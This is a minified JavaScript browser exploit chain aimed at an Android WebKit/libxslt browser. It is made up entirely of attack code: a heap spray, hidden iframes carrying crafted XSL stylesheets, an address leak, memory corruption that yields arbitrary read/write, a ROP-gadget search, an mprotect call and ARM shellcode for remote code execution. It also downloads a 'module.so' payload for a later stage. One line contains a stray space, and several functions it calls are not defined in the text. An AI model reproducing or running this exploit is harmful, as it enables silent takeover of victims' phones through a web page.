var ENABLE_DEBUG = !0,
INVISIBLE = !0,
SEND_LOG = !1,
INFO = function() {},
send_info = function() {},
send_error = function() {};
if (!0 === ENABLE_DEBUG) {
    send_info = function(e) {
        var t = new XMLHttpRequest,
        r = new FormData;
        r.append("logdata", e),
        t.open("POST", "log/info", !0),
        t.send(r)
    },
    send_error = function(e) {
        var t = new XMLHttpRequest,
        r = new FormData;
        r.append("logdata", e),
        t.open("POST", "log/error", !0),
        t.send(r)
    };
    ERR = function(e) {
        throw void 0 === e && (e = "Unspecified error"),
        restorebrowserstate(),
        console.log("EXPLOIT ERROR: " + e),
        send_error(e),
        alert("EXPLOIT ERROR: " + e),
        new Error(e)
    },
    INFO = function(e) {
        console.log(e),
        !0 === SEND_LOG && send_info(e)
    }
} else ERR = function() {
    restorebrowserstate(),
    do_redirect()
};
function do_redirect() {
    throw window.location.replace("about:blank"),
    Error()
}
function restorebrowserstate() {
    void 0 !== window.g_xsltobj && window.g_xsltobj.alive && window.g_xsltobj.terminate()
}
function hex(e, t) {
    var r = e.toString(16);
    if (void 0 === t) return r;
    var a = Array(t + 1).join("0"),
    i = (a + r).slice( - a.length);
    return r.length > i.length ? r: i
}
function Page(e, t, r) {
    void 0 === r && (r = 0),
    this.array = e,
    this.base = t,
    this.index = r,
    this.size = 4 * this.array.length
}
function stringtoarray(e, t) {
    void 0 === t && (t = !0);
    for (var r = [], a = 0; a < e.length; a++) r.push(e.charCodeAt(a));
    return ! 0 === t && r.push(0),
    r
}
function arraytostring(e) {
    return 0 === e[e.length] && e.splice(e.length - 1, 1),
    String.fromCharCode.apply(null, e)
}
function layout_check(e, t) {
    for (var r = {},
    a = 0; a < t.length; a++) {
        var i = t[a],
        s = i[0] - (e + 8),
        o = i[1];
        if (s in r) {
            var n = "0x" + e.toString(16) + " + 0x" + s.toString(16);
            return ERR("layout_check ERROR: redefinition of memory address " + n + ". Previous definition was 0x" + r[s].toString()),
            !1
        }
        r[s] = o
    }
    return ! 0
}
Page.prototype.write = function(e, t) {
    var r = e - (this.base + 8),
    a = t;
    if ((r - this.base) / 4 + this.index > this.array.length) throw new Error("Attempt to write beyond array boundaries");
    if ("number" != typeof a) {
        for (var i = 4 * Math.floor((a.length + 3) / 4), s = new ArrayBuffer(i), o = new Uint8Array(s), n = new Uint32Array(s), d = 0; d < a.length; d++) o[d] = a[d];
        for (d = 0; d < n.length; d++) this.array[r / 4 + this.index + d] = n[d]
    } else this.array[r / 4 + this.index] = a
},
Page.prototype.read = function(e) {
    var t = e - (this.base + 8);
    if ((t - this.base) / 4 + this.index > this.array.length) throw new Error("Attempt to write beyond array boundaries");
    return this.array[t / 4 + this.index]
},
Page.prototype.apply_layout = function(e) {
    for (var t = 0; t < e.length; t++) {
        var r = e[t];
        this.write(r[0], r[1])
    }
},
Page.prototype.in_range = function(e) {
    return ! ((e - (this.base + 8) - this.base) / 4 + this.index > this.array.length)
};
var bigmem = [];
function apply_layout(e, t, r, a) {
    for (var i = 0; i < a.length; i++) {
        var s = a[i],
        o = s[0] - (e + 8),
        n = s[1];
        if ("number" != typeof n) {
            for (var d = 4 * Math.floor((n.length + 3) / 4), l = new ArrayBuffer(d), h = new Uint8Array(l), c = new Uint32Array(l), f = 0; f < n.length; f++) h[f] = n[f];
            for (f = 0; f < c.length; f++) t[o / 4 + r + f] = c[f]
        } else t[o / 4 + r] = n
    }
}
function map_pages(e, t) {
    for (var r = 0; r < t; r++) {
        var a;
        try {
            a = new Uint32Array(1048564),
            bigmem.push(a)
        } catch(e) {
            INFO("Can't map more pages (" + r + ")");
            for (var i = r - 60; i < r; i++) delete bigmem[i],
            bigmem.splice(i, 1);
            break
        }
        apply_layout(0, a, 0, e)
    }
}
function search_pages(e, t) {
    for (var r = 0; r < bigmem.length; r++) for (var a = bigmem[r], i = 0; i < 1024; i++) {
        var s = a[1024 * i + (e - 8) / 4];
        if (s != t) return {
            data: s,
            index: r,
            displ: i
        }
    }
    return null
}
function parseXML(e) {
    return (new DOMParser).parseFromString(e, "text/xml")
}
function loadXML(e) {
    var t = new XMLHttpRequest;
    return t.open("GET", e, !1),
    t.send(),
    t.responseXML
}
function loadtext(e) {
    var t = new XMLHttpRequest;
    return t.open("GET", e, !1),
    t.send(),
    t.responseText
}
function start() {
    stage0()
}
window.start = start;
var trk = 0;
function redirmessage() {
    window.setTimeout(function() {
        var e = document.createElement("p");
        e.innerHTML = "Redirecting...",
        document.body.appendChild(e)
    },
    2500)
}
function stage0() {
    redirmessage(),
    map_pages(transformlayout(0), 330),
    INFO("pages mapped."),
    find_spray_addr(2054172720, 2033201200, -65536)
}
function stage0_done(e, t) {
    INFO("Found address " + hex(t) + " @ page " + e),
    stage1((4294967040 & t) >>> 0, e)
}
function stage0_fail(e) {
    ERR("The spray could not be found in memory ( reached " + hex(e) + ")")
}
function transformlayout(e) {
    for (var t = [], r = 0; r < 64; r++) t.push([e + 65536 * r + r % 16 * 4096 + 48, 1886680168]),
    t.push([e + 65536 * r + r % 16 * 4096 + 52, 1999580986]),
    t.push([e + 65536 * r + r % 16 * 4096 + 56, 1999533943]),
    t.push([e + 65536 * r + r % 16 * 4096 + 60, 1919888947]),
    t.push([e + 65536 * r + r % 16 * 4096 + 64, 959524711]),
    t.push([e + 65536 * r + r % 16 * 4096 + 68, 1479489849]),
    t.push([e + 65536 * r + r % 16 * 4096 + 72, 1412385875]),
    t.push([e + 65536 * r + r % 16 * 4096 + 76, 1936613746]),
    t.push([e + 65536 * r + r % 16 * 4096 + 80, 1836216166]);
    return t
}
function find_spray_addr(e, t, r) {
    if (r >= 0 && e > t) stage0_fail(e);
    else if (r <= 0 && e < t) stage0_fail(e);
    else {
        for (; 15360 == (65280 & e) || 15872 == (65280 & e) || 3932160 == (16711680 & e) || 4063232 == (16711680 & e);) e += r; (65280 & e) >>> 0 < 8192 && (e = r > 0 ? (4294902015 & e) >>> 0 ^ 8192 : (e - 65536 & 4294902015) >>> 0 ^ 28672),
        (65280 & e) > 31232 && (e = r > 0 ? (4294902015 & e) >>> 65536 ^ 8192 : (4294902015 & e) >>> 0 ^ 28672),
        (16711680 & e) >>> 0 < 2097152 && (e = r > 0 ? (4278255615 & e) >>> 0 ^ 2097152 : (e - 16777216 & 4278255615) >>> 0 ^ 7995392),
        (16711680 & e) > 7995392 && (e = r > 0 ? (4278255615 & e) >>> 16777216 ^ 2097152 : (4278255615 & e) >>> 0 ^ 7995392);
        var a = createdocblob(createsheetblob(e).url),
        i = document.createElement("iframe"); ! 0 === INVISIBLE && (i.style.height = 0, i.style.width = 0, i.style.border = "none");
        var s = a.url;
        i.src = s,
        i.onload = function(a) {
            var i = a.currentTarget.contentWindow.location.href;
            i != s && ERR("PHANTOM BUG: expecting " + s + ", got " + i);
            var o = a.currentTarget.contentWindow.document.documentElement;
            return null === o || -1 != o.textContent.indexOf("error") ? void start_bisect(e) : void find_spray_addr(e + r, t, r)
        },
        document.body.appendChild(i)
    }
}
function start_bisect(e) {
    INFO("starting bisect @ " + hex(e)),
    bisect(0, bigmem.length - 1, e)
}
function bisect_clear(e, t) {
    for (var r = e; r <= t; r++) for (var a = 0; a < 64; a++) {
        var i = (65536 * a + a % 16 * 4096 + 48 - 8) / 4;
        bigmem[r][i] = 0
    }
}
function bisect_putback(e, t) {
    for (var r = e; r <= t; r++) for (var a = 0; a < 64; a++) {
        var i = (65536 * a + a % 16 * 4096 + 48 - 8) / 4;
        bigmem[r][i] = 1886680168
    }
}
function bisect(e, t, r) {
    if (e != t) {
        var a = t - e + 1,
        i = e + Math.floor(a / 2);
        bisect_clear(e, i - 1);
        bisect_check(function() {
            bisect_putback(e, i - 1),
            bisect(e, i - 1, r)
        },
        function() {
            bisect_putback(i, t),
            bisect(i, t, r)
        },
        r)
    } else stage0_done(e, r)
}
function bisect_check(e, t, r) {
    var a = document.createElement("iframe"),
    i = createdocblob(createsheetblob(r).url).url; ! 0 === INVISIBLE && (a.style.height = 0, a.style.width = 0, a.style.border = "none"),
    a.src = i,
    a.onload = function(r) {
        var a = r.currentTarget.contentWindow.location.href;
        a != i && ERR("PHANTOM BUG: expecting " + i + ", got " + a);
        var s = r.currentTarget.contentWindow.document.documentElement;
        return null === s || -1 != s.textContent.indexOf("error") ? void t() : void e()
    },
    document.body.appendChild(a)
}
function toascii(e) {
    return arraytostring([e >> 0 & 255, e >> 8 & 255, e >> 16 & 255, e >> 24 & 255])
}
function createdocblob(e) {
    return createblob('<?xml-stylesheet type="text/xsl" href="' + e + '"?><root/>', "application/xml")
}
function createsheetblob(e) {
    var t = "";
    return t += "<!DOCTYPE adoc [",
    t += "\x3c!-- x --\x3e",
    t += '<!ENTITY cdent "',
    t += "<html>XX",
    t += toascii(e),
    t += toascii(e),
    t += "XXXX",
    t += "XXXX",
    t += "<xsl:message xmlns:xsl='http://www.w3.org/1999/XSL/Transform' terminate='yes'/></html>\">",
    t += "\x3c!-- y --\x3e",
    t += "]>\n",
    createblob(t += '<ata xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">&cdent;</ata>', "text/xsl")
}
function createblob(e, t) {
    var r = new WebKitBlobBuilder;
    r.append(e);
    var a = r.getBlob(t);
    return {
        blob: a,
        url: webkitURL.createObjectURL(a)
    }
}
function stage1(e, t) {
    INFO("> [ Stage 1 ]");
    var r = document.createElement("iframe"),
    a = "data.xml?id=" + e.toString();
    r.src = a,
    !0 === INVISIBLE && (r.style.height = 0, r.style.width = 0, r.style.border = "none"),
    r.onload = function(i) {
        var s = i.currentTarget.contentWindow.location.href; - 1 == i.currentTarget.contentWindow.location.href.indexOf("data.xml?id=") && ERR("PHANTOM BUG: iframe src and event target don't match! " + s + " expecting " + a);
        var o = r.contentWindow.document;
        void 0 === o && ERR("Cannot process source XML document");
        var n = parseXML('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="/*"><data><xsl:value-of select="generate-id()" /></data></xsl:template></xsl:stylesheet>');
        INFO("ready to process generate-id stylesheet");
        var d = new XSLTProcessor;
        d.importStylesheet(n);
        var l = d.transformToDocument(o);
        void 0 === l && ERR("Cannot process XML with generate-id stylesheet");
        var h = l.getElementsByTagName("data")[0],
        c = h.childNodes[0].nodeValue; (d = new XSLTProcessor).importStylesheet(n),
        void 0 === (l = d.transformToDocument(o)) && ERR("Cannot process XML with generate-id stylesheet a second time");
        var f = (h = l.getElementsByTagName("data")[0]).childNodes[0].nodeValue;
        INFO(" first id: " + c),
        INFO("second id: " + f),
        c != f && ERR("No infoleak available " + c + " " + f);
        var u = 60 * parseInt(c.substring(2));
        INFO("documentarea: " + u.toString(16)),
        (u < 65536 || u > 4294967295) && ERR("Strange infoleak address: " + hex(u)),
        xslt_exploit(r, o, e, u, t)
    },
    document.body.appendChild(r)
}
function xslt_exploit(e, t, r, a, i) {
    a += 56;
    for (var s = createstage1layout(r, a += 4), o = bigmem[i], n = 0; n < 64; n++) {
        for (var d = (65536 * n + n % 16 * 4096) / 4, l = 0; l < 40; l++) o[d - 2 + 12 + l] = 0;
        apply_layout(r, o, d, s)
    }
    var h = parseXML('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="ztX">  <xsl:if test="text()=ELZ">    <xsl:apply-templates/>    <xsl:message terminate="yes"/>  </xsl:if></xsl:template><xsl:template match="/*">  <xsl:for-each select="namespace::*">    <xsl:if test="position() = 2">      <xsl:apply-templates />    </xsl:if>  </xsl:for-each></xsl:template></xsl:stylesheet>'),
    c = new XSLTProcessor;
    c.importStylesheet(h);
    c.transformToDocument(t);
    var f = null,
    u = null;
    for (l = 0; l < 1024; l++) if (0 !== (u = o[1024 * l + 32])) {
        f = l;
        break
    }
    null === f && ERR("Modified page not found :("),
    trk += 255 & u;
    var p = ((4294967040 & u) >>> 0) - 1024 * f * 4;
    if (ENABLE_DEBUG) {
        var m = "FOUND IT :) " + u.toString(16) + " [index: " + i + ", displ: " + f + "] pagebase: " + hex(p) + " base: " + hex(r);
        INFO(m)
    }
    stage2(new Page(o, p, 0), r, e, t, a)
}
function createstage1layout(e, t) {
    for (var r, a = e + 464,
    i = a >> 0 & 255,
    s = a >> 8 & 255,
    o = a >> 16 & 255,
    n = a >> 24 & 255,
    d = i << 16 | s << 24,
    l = n << 8 | o,
    h = [[e + 18 + 2, 196608], [e + 18 + 22, d], [e + 18 + 26, l], [e + 18 + 30, 0], [e + 18 + 34, 0], [e + 68 + 4, 1], [e + 68 + 8, e + 448], [e + 68 + 12, e + 240], [e + 68 + 24, e + 712], [e + 52 + 80, e + 176], [e + 144 + 4, 3], [e + 144 + 40, e + 456], [e + 176 + 16, e + 208], [e + 208 + 4, 4026531839], [e + 240 + 4, 3], [e + 240 + 24, e + 364], [e + 240 + 40, t], [e + 304 + 4, 14], [e + 364 + 4, 1], [e + 364 + 8, e + 452], [e + 364 + 12, e + 144], [e + 364 + 24, e + 400], [e + 400 + 4, 14], [e + 400 + 24, e + 18], [e + 400 + 28, t - 24], [e + 448, 5796986], [e + 452, 5917765], [e + 456, 1], [e + 464 + 4, 14], [e + 464 + 28, t + 1 - 24]], c = 2; c <= 15; c++) t -= 4,
    d = (i = (a = (r = e + 256 * c) + 156) >> 0 & 255) << 16 | (s = a >> 8 & 255) << 24,
    l = (n = a >> 24 & 255) << 8 | (o = a >> 16 & 255),
    h.push([r + 18 + 2, 196608]),
    h.push([r + 18 + 22, d]),
    h.push([r + 18 + 26, l]),
    h.push([r + 18 + 30, 0]),
    h.push([r + 64 + 4, 3]),
    h.push([r + 64 + 24, r + 108]),
    h.push([r + 64 + 40, t]),
    h.push([r + 108 + 4, 1]),
    h.push([r + 108 + 8, e + 452]),
    h.push([r + 108 + 12, e + 144]),
    h.push([r + 108 + 24, r + 168]),
    h.push([r + 156 + 4, 14]),
    h.push([r + 156 + 28, t + 1 - 24]),
    h.push([r + 168 + 4, 14]),
    h.push([r + 168 + 24, r + 18]),
    h.push([r + 168 + 28, t - 24]),
    h.push([r + 200 + 4, 1]),
    h.push([r + 200 + 8, e + 448]),
    h.push([r + 200 + 12, r + 64]),
    15 != c && h.push([r + 200 + 24, r + 456]);
    return h
}
function stage2(e, t, r, a, i) {
    INFO("> [ Stage 2 ]");
    var s = null;
    0 !== e.read(t + 18 + 30) && INFO("Trashed XML_ELEMENT_NODE: " + (s = i - 4).toString(16));
    for (var o = 2; o <= 15; o++) {
        var n = t + 256 * o;
        0 !== e.read(n + 18 + 30) && INFO(null === s ? "Trashed XML_ELEMENT_NODE: " + (s = i - 4 * o).toString(16) : "WARNING: undefined data trashed")
    }
    var d = t + 4352;
    e.in_range(t + 8192) || (d = 65536 + ((4294901760 & e.base) >>> 0) + 12288, INFO((t + 8192).toString(16) + " not in range! reducing to " + d.toString(16)));
    var l = document.createElement("iframe"); ! 0 === INVISIBLE && (l.style.height = 0, l.style.width = 0, l.style.border = "none");
    var h = "data.xml?id=" + t.toString() + "&contentId=" + (d + 68).toString();
    l.setAttribute("src", h),
    l.onload = function() {
        INFO("Document loaded.");
        var r = l.contentWindow.document;
        void 0 === r && ERR("Cannot process source XML document");
        var i = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="/*"><data><xsl:value-of select="generate-id()" /></data></xsl:template></xsl:stylesheet>',
        o = parseXML(i),
        n = new XSLTProcessor;
        n.importStylesheet(o);
        var h = n.transformToDocument(r);
        void 0 === h && ERR("Cannot process XML with generate-id stylesheet");
        var c = h.getElementsByTagName("data")[0].childNodes[0].nodeValue;
        INFO(" first id: " + c);
        var f = 60 * parseInt(c.substring(2));
        INFO("documentarea: " + f.toString(16)),
        f += 56,
        f += 4;
        for (var u = 0; u < 1024; u++) e.write(d + 4 * u, 0);
        var p = createstage1layout(t, f);
        p.push([t + 68 + 28, 0]),
        p.push([t + 112 + 24, 0]);
        for (u = 2; u <= 15; u++) p.push([t + 256 * u + 18 + 30, 0]);
        var m = [[d + 2048 + 0, 7239026], [d + 68 + 4, 1], [d + 68 + 8, d + 2048], [d + 68 + 12, d + 128], [d + 68 + 24, d + 176], [d + 128 + 4, 14], [d + 128 + 28, s + 4 - 24], [d + 128 + 24, d + 1], [d + 1 + 3, [0, 3]], [d + 176 + 4, 1], [d + 176 + 8, d + 2048], [d + 176 + 12, d + 240], [d + 176 + 24, d + 304], [d + 240 + 4, 14], [d + 240 + 28, s + 5 - 24], [d + 240 + 24, 0], [d + 304 + 4, 1], [d + 304 + 8, d + 2048], [d + 304 + 12, d + 368], [d + 304 + 24, d + 416], [d + 368 + 4, 14], [d + 368 + 24, e.base + 4096], [d + 368 + 28, s + 12 - 24], [d + 416 + 4, 1], [d + 416 + 8, d + 2048], [d + 416 + 12, d + 512], [d + 416 + 24, t + 68], [d + 512 + 4, 14], [d + 512 + 24, e.base + 8192], [d + 512 + 28, s + 8 - 24], [e.base + 4096 + 4, 3], [e.base + 4096 + 24, 0], [e.base + 4096 + 20, 0], [e.base + 4096 + 28, 0], [e.base + 4096 + 40, 0], [e.base + 4096 + 44, 0], [e.base + 8192 + 4, 3], [e.base + 8192 + 24, 0], [e.base + 8192 + 20, 0], [e.base + 8192 + 28, 0], [e.base + 8192 + 40, 0], [e.base + 8192 + 44, 0]];
        p.push.apply(p, m),
        e.apply_layout(p),
        INFO("Stage2 layout applied."),
        o = parseXML(i = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" ><xsl:template match="run">  <xsl:apply-templates/></xsl:template><xsl:template match="ztX">  <xsl:if test="text()=ELZ">    <xsl:apply-templates/>    <xsl:message terminate="yes"/>  </xsl:if></xsl:template><xsl:template match="/*">  <xsl:for-each select="namespace::*">    <xsl:if test="position() = 2">      <xsl:apply-templates />    </xsl:if>  </xsl:for-each></xsl:template></xsl:stylesheet>'),
        (n = new XSLTProcessor).importStylesheet(o);
        n.transformToDocument(r);
        var b = null;
        0 !== e.read(t + 18 + 30) && (INFO("Second trashed (1) XML_ELEMENT_NODE: " + (b = f - 4).toString(16)), ENABLE_DEBUG && INFO("base + 0x12 + 30 = " + hex(e.read(t + 18 + 30), 8)));
        for (u = 2; u <= 15; u++) {
            var g = t + 256 * u;
            0 !== e.read(g + 18 + 30) && INFO(null === b ? "Second trashed (loop " + u + ") XML_ELEMENT_NODE: " + (b = f - 4 * u).toString(16) : "WARNING: undefined data trashed " + hex(f - 4 * u))
        }
        var y = new XSLTObject(e, e.base + 4096, e.base + 8192, s, a),
        w = "myawesomedocument";
        y.set_root_name(w);
        var v = y.get_root_name();
        v != w && ERR("MemoryObject sanity check failed! " + v),
        INFO("MemoryObject created successfully.");
        var x = y.read32(b + 12),
        O = y.read32(x + 8);
        INFO("Leaked webcore address: " + O.toString(16)),
        y.zero(b + 8),
        y.zero(b + 12),
        y.zero(b + 40),
        stage2_overwrite(y, e, O)
    },
    document.body.appendChild(l),
    INFO("Starting module download ...");
    var c = new XMLHttpRequest;
    c.open("GET", "module.so", !0),
    c.responseType = "arraybuffer",
    c.onreadystatechange = function(e) {
        if (4 == c.readyState) if (200 == c.status) {
            var t = c.response;
            t ? (INFO("Module downloaded. " + typeof t), window.g_module = new DataView(t)) : INFO("Could not download module")
        } else window.g_module = null,
        INFO("Could not download module: server returned status " + c.status)
    },
    c.send(null)
}
function stage2_overwrite(e, t, r) {
    for (var a, i = t.base + 12288,
    s = 0,
    o = i; o < i + 4096; o += 64) t.write(o - 4, 19),
    t.write(o + 4, 36877),
    t.write(o + 16 - 4, i + 8192 | 3),
    t.write(o + 24, o + 64),
    s += 1;
    t.write(o - 64 + 24, 0),
    t.write(i + 8196, [0, 0, 0, 14]),
    e.free(i),
    INFO("Array free() done. Addr = " + hex(i) + " Cur = " + hex(o));
    var n = [];
    for (a = 0; a < 3 * s; a++) n.push(new ArrayBuffer(2989));
    for (o = i; o < i + 4096; o += 64) if (2989 == t.read(o + 4)) {
        t.write(o + 4, 4294967295),
        t.write(o + 8, 0),
        INFO("Overwrite ArrayBuffer @" + o.toString(16));
        break
    }
    var d = null;
    for (a in n) if (2989 != n[a].byteLength) {
        INFO("arrays[" + a + "].byteLength = " + n[a].byteLength.toString(16)),
        d = n[a],
        INFO("Found array (position: " + a + ")"),
        trk *= n[a].byteLength;
        break
    }
    null === d && ERR("ArrayBuffer not found. The browser will most likely crash when the current tab is closed.");
    var l = new BufferMemoryObject(d);
    l.write32(t.base, 318767103, !0);
    var h = 0;
    for (o = i + 4096; o < i + 8176; o += 64) t.write(o - 4, 51),
    t.write(o + 4, 36877),
    t.write(o + 48 - 4, i + 8192 | 3),
    t.write(o + 24, o + 64),
    h += 1;
    t.write(o - 64 + 24, 0),
    e.free(i + 4096),
    INFO("Node free() done");
    var c = [];
    for (a = 0; a < 3 * h; a++) c.push(document.createTextNode("hello" + a));
    var f = function(e, t, r) {
        for (var a = null,
        i = null,
        s = e; s < t; s += r) if (51 == l.read32(s - 4) && 5767169 == l.read32(s + 36)) {
            INFO("Overwrite WebCore::Text @ " + s.toString(16)),
            a = s;
            var o = l.read32(s + 40),
            n = l.read32(o + 8);
            l.write8(n, "W".charCodeAt(0)),
            l.read32(s);
            break
        }
        for (var d in c) if ("W" == c[d].nodeValue.slice(0, 1)) {
            INFO("Found node (position: " + d + ")"),
            i = c[d];
            break
        }
        return null === i || null === a ? null: {
            obj: i,
            addr: a,
            dataoffset: 40
        }
    } (i + 4096, i + 8192, 64);
    if (null === f) {
        for (INFO("Node not found. Trying the alternate node data structure"), h = 0, o = i + 8448; o < i + 12288; o += 80) t.write(o - 4, 67),
        t.write(o + 4, 36877),
        t.write(o + 24, o + 80),
        t.write(o + 64 - 4, i + 8192 | 3),
        h += 1;
        for (t.write(o - 80 + 24, 0), e.free(i + 8448), INFO("Retry node free() done"), c = [], a = 0; a < 3 * h; a++) c.push(document.createTextNode("hello" + a));
        f = function(e, t, r) {
            for (var a = null,
            s = null,
            o = null,
            n = e; n < t; n += r) if (67 == l.read32(n - 4)) {
                for (var d = 0; d < 16; d++) if (5767169 == l.read32(n + 4 * d)) {
                    o = 4 * d + 12,
                    INFO("Overwrite WebCore::Text @ " + hex(n)),
                    a = n;
                    var h = l.read32(n + o);
                    if (h < 65536) return INFO("find_node_40: Invalid data value for text node: " + hex(h, 8) + " (type offset: " + 4 * d + ", dataoffset: " + o),
                    null;
                    var f = l.read32(h + 8);
                    l.write8(f, "W".charCodeAt(0)),
                    l.read32(n);
                    break
                }
                break
            }
            for (var d in c) if ("W" == c[d].nodeValue.slice(0, 1)) {
                INFO("Found node (position: " + d + ")"),
                s = c[d];
                break
            }
            return null === s || null === i ? null: {
                obj: s,
                addr: a,
                dataoffset: o
            }
        } (i + 8448, i + 12288, 80)
    }
    if (e.terminate(), INFO("xsltobject removed"), null === f) {
        if (ENABLE_DEBUG) {
            INFO("The overwritten node object could not be found"),
            INFO(" "),
            INFO("-------- EXPLOIT ERROR -- DEBUG DUMP --------"),
            INFO(" ");
            for (o = i + 4096; o < i + 8192; o += 64) {
                for (var u = o - 4; u < o + 64; u += 16) INFO(hex(u, 8) + ": " + hex(l.read32(u), 8) + " " + hex(l.read32(u + 4), 8) + " " + hex(l.read32(u + 8), 8) + " " + hex(l.read32(u + 12), 8));
                INFO(" ")
            }
            INFO("---------------------------------------------");
            for (o = i + 8448; o < i + 12288; o += 80) {
                for (u = o - 4; u < o + 80; u += 16) INFO(hex(u, 8) + ": " + hex(l.read32(u), 8) + " " + hex(l.read32(u + 4), 8) + " " + hex(l.read32(u + 8), 8) + " " + hex(l.read32(u + 12), 8));
                INFO(" ")
            }
            INFO("---------------------------------------------")
        }
        ERR("The overwritten node object could not be found")
    }
    stage3(l, r, f, i, t)
}
var CALLSTUB = [255, 64, 45, 233, 70, 79, 143, 226, 0, 64, 148, 229, 0, 80, 148, 229, 0, 0, 85, 227, 17, 0, 0, 10, 4, 112, 148, 229, 0, 0, 87, 227, 4, 0, 0, 10, 2, 112, 160, 227, 0, 0, 0, 239, 28, 0, 132, 229, 0, 0, 80, 227, 52, 0, 0, 26, 8, 0, 148, 229, 12, 16, 148, 229, 16, 32, 148, 229, 20, 48, 148, 229, 24, 64, 148, 229, 53, 255, 47, 225, 204, 64, 143, 226, 0, 64, 148, 229, 28, 0, 132, 229, 42, 0, 0, 234, 196, 80, 143, 226, 0, 80, 149, 229, 0, 80, 132, 229, 156, 0, 143, 226, 0, 0, 144, 229, 152, 64, 143, 226, 0, 64, 148, 229, 148, 80, 143, 226, 0, 80, 149, 229, 0, 208, 144, 229, 4, 208, 77, 226, 0, 0, 157, 229, 4, 0, 80, 225, 251, 255, 255, 58, 5, 0, 80, 225, 249, 255, 255, 42, 32, 208, 141, 226, 112, 64, 143, 226, 0, 64, 148, 229, 108, 80, 143, 226, 0, 80, 149, 229, 8, 0, 157, 229, 4, 0, 80, 225, 11, 0, 0, 58, 5, 0, 80, 225, 9, 0, 0, 42, 88, 0, 143, 226, 0, 0, 144, 229, 1, 0, 80, 227, 0, 0, 0, 10, 48, 128, 189, 232, 64, 176, 143, 226, 0, 176, 155, 229, 48, 0, 189, 232, 116, 106, 148, 229, 4, 240, 157, 228, 12, 0, 157, 229, 4, 0, 80, 225, 2, 0, 0, 58, 5, 0, 80, 225, 0, 0, 0, 42, 112, 128, 189, 232, 240, 128, 189, 232, 255, 128, 189, 232, 0, 221, 218, 186, 1, 221, 218, 186, 2, 221, 218, 186, 3, 221, 218, 186, 4, 221, 218, 186, 5, 221, 218, 186, 6, 221, 218, 186, 7, 221, 218, 186];
function stage3(e, t, r, a, i) {
    INFO("> [ Stage 3 ]");
    var s = e.findimagebase(t);
    INFO("Found libwebcore.so imagebase: " + s.toString(16));
    var o = new ELFObject(s, e),
    n = o.findreloc("fopen");
    INFO("fopen address = " + n.toString(16));
    var d = e.findimagebase(n);
    INFO("libc base address: " + d.toString(16));
    var l = new ELFObject(d, e);
    INFO("Searching gadgets ...");
    var h = {};
    if (h.ggt2 = {
        addr: l.findstring("䚽䂰뀃䝰", r)
    },
    null === h.ggt2.addr) return INFO("Gadget 2 not found: trying alternate chain"),
    void stage3_alternate(e, r, a, i, o, l);
    if (check_gadgets(h), h.ggt1 = gadget1_fastheur(o, r), null === h.ggt1 ? (INFO("fastheur failed"), h.ggt1 = gadget1_slowsearch(o, e, r)) : INFO("Found Gadget 1 via fastheur"), check_gadgets(h), h.str_r1_r4 = {
        addr: l.findstring("恡봐", r),
        disp: 4
    },
    null === h.str_r1_r4.addr && (h.str_r1_r4 = {
        addr: l.findstring("怡봐", r),
        disp: 0
    }), null === h.str_r1_r4.addr && (h.str_r1_r4 = {
        addr: o.findstring("怡봐", r),
        disp: 0
    }), null === h.str_r1_r4.addr && (h.str_r1_r4 = {
        addr: o.findstring("恡봐", r),
        disp: 4
    }), check_gadgets(h), h.pop_r0_pc = {
        addr: l.findstring("老", r)
    },
    check_gadgets(h), h.pop_r1__r5_pc = {
        addr: l.findstring("봾", r)
    },
    check_ gadgets(h), INFO("--- Gadget search completed --- "), ENABLE_DEBUG) for (var c in h) {
        var f = "";
        for (var u in h[c])"addr" != u && (f += u + ": " + h[c][u] + " ");
        "" !== f && (f = "[ " + f + "]"),
        INFO("  " + hex(h[c].addr, 8) + " " + c + "  " + f)
    }
    for (var p = a + 32768,
    m = 0; m < 94; m++) e.write32(p + 4 * m, h.ggt1.addr + 1);
    e.write32(p + 0, 3124970307),
    e.write32(p + 4, 3125036100),
    e.write32(p + 8, a + 33792),
    e.write32(p + 12, h.ggt2.addr + 1),
    e.write32(p + h.ggt1.disp, h.ggt2.addr + 1);
    var b = l.findsymbol("mprotect");
    INFO("mprotect address: " + hex(b)),
    INFO("Stack will be written in " + hex(a + 33536 + h.str_r1_r4.disp));
    var g = a + 33792,
    y = a + 40960,
    w = [a + 33536, 3735928549, 3735928551, h.str_r1_r4.addr + 1, 3735928544, 3735928548, 3735928552, 3735928548, h.pop_r0_pc.addr, i.base, h.pop_r1__r5_pc.addr + 1, i.size - 256, 7, 0, g + 4, 0, b, 0, y];
    for (var v in w) e.write32(g + 4 * v, w[v]);
    var x = a + 24576;
    e.write32(x + 0, 0),
    e.write32(x + 4, 0),
    e.write32(x + 8, 0),
    e.write32(x + 12, 0),
    e.write32(x + 16, 0),
    e.write32(x + 20, 0),
    e.write32(x + 24, 0),
    e.write32(x + 28, 0);
    for (v = 0; v < CALLSTUB.length; v++) e.write8(y + v, CALLSTUB[v]);
    var O = o.addr,
    E = o.addr + o.size,
    j = o.findreloc("_ZN2v87Context5EnterEv");
    if (null !== j) {
        INFO("v8 is separate from libwebcore. Adjusting checks...");
        var _ = e.findimagebase(j);
        O = (_ = new ELFObject(_, e)).addr,
        E = _.addr + _.size
    }
    for (v = 0; v < CALLSTUB.length / 4; v++) switch (e.read32(y + 4 * v)) {
    case 3134905600:
        e.write32(y + 4 * v, a + 33536 + h.str_r1_r4.disp);
        break;
    case 3134905601:
        e.write32(y + 4 * v, o.addr);
        break;
    case 3134905602:
        e.write32(y + 4 * v, o.addr + o.size);
        break;
    case 3134905603:
        e.write32(y + 4 * v, O);
        break;
    case 3134905604:
        e.write32(y + 4 * v, E);
        break;
    case 3134905605:
        e.write32(y + 4 * v, x);
        break;
    case 3134905606:
        e.write32(y + 4 * v, 0)
    }
    var L = e.read32(r.addr);
    e.write32(r.addr, p),
    r.obj.nodeValue = "x",
    e.write32(r.addr, L),
    INFO("Got out of function call. Building RCECall");
    var R = e.read32(x);
    e.write32(x, 0),
    download_stage4(e, new RCE(e, r, x, y, p), l, o, a, trk *= R)
}
function check_gadgets(e) {
    for (var t in e) null !== e[t] && null !== e[t].addr || ERR("Cannot find gadget: " + t)
}
